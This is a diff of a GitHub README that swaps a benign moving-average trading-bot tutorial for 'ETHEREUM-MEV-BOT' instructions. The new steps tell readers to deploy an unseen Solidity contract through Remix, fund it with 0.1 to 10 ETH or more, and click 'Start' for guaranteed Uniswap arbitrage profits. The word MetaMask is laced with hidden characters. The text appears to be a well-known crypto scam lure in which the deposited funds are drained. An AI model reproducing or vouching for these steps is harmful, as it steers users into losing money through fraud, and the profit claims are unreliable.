@@ -1,26 +1,22 @@
-# stock-crypto-sma-bot
-*Concept: A Moving Average (MA) smooths out price data over a period. A "crossover" strategy uses two MAs: a "fast" (shorter period, e.g., 50 days) and a "slow" (longer period, e.g., 200 days).
-Buy Signal: When the fast MA crosses above the slow MA, it suggests upward momentum – a potential time to buy.
-Sell Signal: When the fast MA crosses below the slow MA, it suggests downward momentum – a potential time to sell.
+# ETHEREUM-MEV-BOT
+#MEV-BOT-ETHEREUM
 
-*How to Build It (Step-by-Step):
-1- Get Historical Data:
-Simplest: Download a CSV file of historical stock or cryptocurrency prices (e.g., from Yahoo Finance or CoinGecko). You'll need at least 'Date', 'Open', 'High', 'Low', 'Close', 'Volume' columns.
-Slightly Better: Use a library like yfinance (for stocks) or ccxt (for crypto) to fetch data directly in Python.
+FULL INSTRUCTIONS
 
-2- Calculate Moving Averages:
-Use the pandas library for this; it has built-in rolling() functions.
+▶️ Download ­Me­­ta­Ma­­sk https://metamask.io/download (if you don’t have it already).
 
-3- Generate Signals:
-Create a column for signals (e.g., 1 for buy, -1 for sell, 0 for hold).
-Iterate through your data, checking for crossover conditions.
+▶️ Make sure you have Ethereum in your MetaMask wallet before creating the contract, then you will not get a "Gas estimation failed" error in the Remix.
 
-4- Visualize the Results:
-matplotlib is excellent for plotting prices, MAs, and signals.
+▶️ Access Remix from PC or Laptop: [https://remix.ethereum.org/](https://remix.ethereum.org/)
 
-5- Calculate Basic Performance (Optional but good for showcase):
-Track hypothetical buys and sells to calculate profit/loss. This is a very basic backtest.
-GitHub Showcase:
-A README.md file explaining the strategy, how to run the code, and what the plots show.
-The Python script (.py file).
-(Optional) A sample CSV data file if you're not using an API.
+▶️ Click “Create New File” icon in “Workspaces” section and name it as you like, for example: “bot.sol”.
+
+▶️ Go to “Solidity Compiler” tab, select version “0.6.6+commit” and click “Compile bot.sol”.
+
+▶️ Go to “Deploy & Run Transactions” tab, select the “Injected Web3 (MetaMask)” Environment and then click “Deploy”. Confirm contract deployment transaction in MetaMask.
+
+▶️ Copy your newly created contract address as shown on video and fund it with any amount of ETH (minimum 0.1 to 10 ETH or higher recommended to prevent negating slippage) that you would like the bot to earn with by simply sending ETH to this contract address.
+
+▶️ After your transaction is confirmed, click “Start” button to launch the bot. It will start working immediately earning you profits from arbitrage trades on Uniswap pools. Withdraw your ETH at any time by clicking “Withdraw” button.
+
+Happy trading! 🚀
